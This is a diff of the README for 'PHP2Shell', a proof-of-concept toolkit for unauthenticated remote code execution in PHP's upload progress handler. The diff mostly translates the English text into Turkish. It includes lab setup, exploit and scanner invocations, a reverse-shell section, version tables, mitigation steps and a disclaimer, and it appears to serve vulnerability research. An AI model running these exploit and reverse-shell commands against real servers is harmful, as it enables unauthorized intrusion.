@@ -32,17 +32,21 @@
 
 ---
 
-## 📋 Overview
+## Overview
 
-**PHP2Shell** is a full-chain exploit toolkit for critical vulnerabilities in PHP's session upload progress handler. These bugs affect **every PHP application** running on `mod_php` — no authentication, no file upload, no `session_start()` required. Just a single HTTP POST to any `.php` endpoint is enough.
+PHP session upload progress handler'daki kritik zafiyetler icin exploit toolkit.
+`mod_php` uzerinde calisan **her** PHP uygulamasini etkiler — kimlik dogrulama,
+dosya yukleme veya `session_start()` cagirisi gerekmez. Tek bir multipart POST
+yeterli.
 
-Originally discovered by [Wiz Research](https://www.wiz.io/blog/php2shell-php-rce) (Oct 2026), this repository provides independently verified proof-of-concept exploits covering **4 distinct bugs** and **6 exploit paths** across WordPress, Drupal, and Joomla.
+Wiz Research tarafindan kesfedildi (Ekim 2026). Bu repo, 4 farkli bug ve
+6 exploit yolu icin bagimsiz olarak dogrulanmis PoC'ler iceriyor.
 
-> **⚠️ Severity:** Unauthenticated RCE with CVSS 9.2. Affects ~30% of all PHP deployments using `mod_php` (Apache prefork).
+**Onem:** CVSS 9.2, unauthenticated RCE. Tum PHP deploymentlarinin ~%30'u (`mod_php`) etkileniyor.
 
 ---
 
-## 🎯 Vulnerability Matrix
+## Zafiyet Matrisi
 
 | # | Bug | CVE | Impact | Scope |
 |---|-----|-----|--------|-------|
@@ -64,9 +68,9 @@ Originally discovered by [Wiz Research](https://www.wiz.io/blog/php2shell-php-rc
 
 ---
 
-## 🚀 Quick Start
+## Hizli Baslangic
 
-### 1. Spin Up the Lab (30 seconds)
+### Lab Kurulumu
 
 ```bash
 git clone https://github.com/memuratozturk/php2shell-poc.git
@@ -76,7 +80,7 @@ docker-compose up -d
 
 This starts **WordPress** (`:9080`), **Drupal** (`:9081`), and **Joomla** (`:9082`) — all running vulnerable PHP 8.4.26 on `mod_php`.
 
-### 2. Run the Exploit
+### Exploit Calistirma
 
 ```bash
 # WordPress RCE
@@ -89,7 +93,7 @@ python3 exploit/memdisclosure.py -u http://127.0.0.1:9080/index.php --dump leak.
 python3 tools/scanner.py -u http://target.com
 ```
 
-### 3. Interactive Shell
+### Reverse Shell
 
 ```bash
 # Terminal 1: Start listener
@@ -101,7 +105,7 @@ python3 exploit/php2shell_exploit.py -u http://target/index.php --shell --target
 
 ---
 
-## 💻 Demo Output
+## Demo Ciktisi
 
 > **Note:** The tool outputs below are shown exactly as produced during lab
 > testing. Some status messages appear in Turkish (the author's native
@@ -177,7 +181,7 @@ Linux php836-lab 6.8.0 #1 SMP x86_64 GNU/Linux
 
 ---
 
-## 📸 Screenshots & Evidence
+## Ekran Goruntuleri & Kanitlar
 
 > The images below are rendered directly from the raw transcripts in
 > [`evidence/`](evidence/) by [`tools/render_evidence_images.py`](tools/render_evidence_images.py) —
@@ -214,7 +218,7 @@ Linux php836-lab 6.8.0 #1 SMP x86_64 GNU/Linux
 
 ---
 
-## 📂 Repository Structure
+## Repo Yapisi
 
 ```
 php2shell-poc/
@@ -266,7 +270,7 @@ php2shell-poc/
 
 ---
 
-## 🔬 Patched vs Unpatched
+## Yamali vs Yamasiz
 
 | Version | Heap Leak | RCE | Status |
 |---------|-----------|-----|--------|
@@ -285,7 +289,7 @@ php2shell-poc/
 
 ---
 
-## 📊 Affected Versions
+## Etkilenen Surumler
 
 | PHP Branch | Vulnerable Range | Fixed In | Notes |
 |------------|-----------------|----------|-------|
@@ -300,9 +304,9 @@ php2shell-poc/
 
 ---
 
-## 🛡️ Mitigation
+## Korunma
 
-### Immediate Actions
+### Acil Adimlar
 
 ```bash
 # 1. Check your PHP version
@@ -330,9 +334,9 @@ sudo dnf update php
 
 ---
 
-## 📖 Detailed Usage
+## Detayli Kullanim
 
-### Remote RCE Exploit (`php2shell_exploit.py`)
+### Remote RCE (`php2shell_exploit.py`)
 
 ```bash
 # Basic RCE with proof file
@@ -407,7 +411,7 @@ python3 tools/scanner.py -u https://target.com --https --timeout 15
 
 ---
 
-## 🔗 References
+## Referanslar
 
 | Resource | Link |
 |----------|------|
@@ -420,34 +424,28 @@ python3 tools/scanner.py -u https://target.com --https --timeout 15
 
 ---
 
-## 👤 Credits
+## Krediler
 
-- **Wiz Research** — Original discovery of the 4-bug chain and responsible disclosure
-- **[@memuratozturk](https://github.com/memuratozturk)** — Independent reproduction, cross-platform exploit development, 3 CMS verification, scanner & tooling
-- **PHP Security Team** — Rapid patching (PHP 8.4.27, 8.3.36, 8.2.35, 8.5.12)
+- **Wiz Research** — 4-bug zincirinin kesfi ve sorumlu ifsa
+- **[@memuratozturk](https://github.com/memuratozturk)** — Bagimsiz dogrulama, cross-platform exploit, 3 CMS testi, araclar
+- **PHP Security Team** — Hizli yama (8.4.27, 8.3.36, 8.2.35, 8.5.12)
 
 ---
 
-## ⚠️ Disclaimer
+## Sorumluluk Reddi
 
 ```
-This tool is provided for AUTHORIZED SECURITY TESTING and EDUCATIONAL PURPOSES ONLY.
+YALNIZCA yetkili guvenlik testleri ve egitim amaciyla sunulmaktadir.
 
-Usage of this tool against targets without prior mutual consent is ILLEGAL.
-It is the end user's responsibility to obey all applicable local, state, and
-federal laws. The developers assume NO liability and are NOT responsible for
-any misuse or damage caused by this program.
-
-By using this tool, you agree that you are authorized to test the target systems
-and accept full responsibility for your actions.
+Izinsiz kullanim YASA DISIdir. Yerel yasalara uymak kullanicinin
+sorumluluğundadir. Gelistiriciler kotuye kullanim veya hasardan
+sorumlu tutulamaz.
 ```
 
 ---
 
 <div align="center">
 
-**If this research helped you, consider giving it a ⭐**
-
-Made with 🔬 by [@memuratozturk](https://github.com/memuratozturk)
+[@memuratozturk](https://github.com/memuratozturk)
 
 </div>
